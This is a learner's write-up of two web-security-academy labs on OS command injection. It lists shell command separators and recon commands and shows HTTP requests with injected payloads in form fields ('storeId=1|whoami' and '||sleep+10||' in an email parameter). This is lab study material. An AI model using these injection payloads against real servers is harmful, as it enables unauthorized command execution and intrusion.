Task 1:
///Lab: OS command injection, simple case///

This lab is an shell command ijection vulnerability, which means we can give direct shell orders to the server. But how?
In URL:
     ;               separating the commands
     & or &&         run in the background or run after or  xy AND yz
     | or ||         xy OR yz or giving data like with grep
Orders we can use: 
whoami
ls -la or dir depends on os
ifconfig 
ip a
cat
get

In our case we will write this in the url like we search parameters like productId=1 or storeId=xy.
If we check our site and click one of the products in the url there is our first parameter: /product?productId=1, but this is not vulnerable to command injection.
Ask down one products stock numbers, and check the request:
POST /product/stock HTTP/1.1
Host: 0a23006603804a7f80245dac003400ce.web-security-academy.net
Cookie: session=HYU4NNUZhtkhzgtJNl1TfzVp2vmjd3VD
Content-Length: 21
---
Connection: keep-alive

productId=1&storeId=1

Send the request to the repeater, and change it to:
productId=1&storeId=1|whoami
And we got: 
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 13

peter-GQBzFz

Task 2:
///Lab: Blind OS command injection with time delays///

Time delays command is: sleep X (where x is a number like sleep 5, the response will sleep for 5 secs)
So there is a submit feedback part of the site, do a submit and in http history check the request:
POST /feedback/submit HTTP/2
Host: 0a9000350324721281b41b0800230061.web-security-academy.net
---
Priority: u=1, i

csrf=DEZSKA6E6IXIaGMHYqjNeiLVtKWD2Dvp&name=oinm&email=asnd%40sinda.hu&subject=kalsdn&message=aimdms
Now all we have to do is insert the sleep 10 somewhere between the parameters.
with ||sleep+10|| we can do this (the email parameter will be the vulnerable):
csrf=DEZSKA6E6IXIaGMHYqjNeiLVtKWD2Dvp&name=oinm&email=asnd%40sinda.hu||sleep+10||&subject=kalsdn&message=aimdms

